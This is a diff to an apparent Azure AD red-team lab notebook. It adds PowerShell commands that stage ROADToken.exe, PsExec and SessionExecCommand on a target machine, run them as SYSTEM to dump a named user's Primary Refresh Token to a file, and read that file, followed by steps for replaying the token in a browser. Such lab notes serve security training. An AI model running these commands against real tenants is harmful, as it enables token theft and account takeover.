@@ -471,6 +471,20 @@ $Result.Nonce
 ```
 #### Steal PRT
 
+[Stage](https://github.com/conma293/Azure/blob/main/killcycle.md#session-play) the binaries ```PsExec64.exe``` ```SessionExecCommand.exe``` and ```ROADToken.exe``` on the machine with the user who has a PRT.
+```
+Copy-Item -ToSession $TargetVM -Path C:\AzAD\Tools\ROADToken.exe -Destination C:\ProgramData\ –Verbose 
+```
+
+Run scripts as user who possesses the PRT: 
+```
+Invoke-Command -Session $infradminsrv -ScriptBlock{C:\ProgramData\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\ProgramData\SessionExecCommand.exe MichaelMBarron C:\ProgramData\ROADToken.exe <nonce> > C:\ProgramData\PRT.txt"}
+```
+
+Show PRT:
+```
+Invoke-Command -Session $infradminsrv -ScriptBlock{cat C:\Users\Public\student213\PRT.txt}
+```
 #### Pass PRT
 - goto ```https://login.microsoftonline.com/login.srf``` in incognito browser
 - clear all cookies - Press F12 (Chrome dev tools) -> Application -> Cookies (may want to revisit site after clear before adding cookie as below)
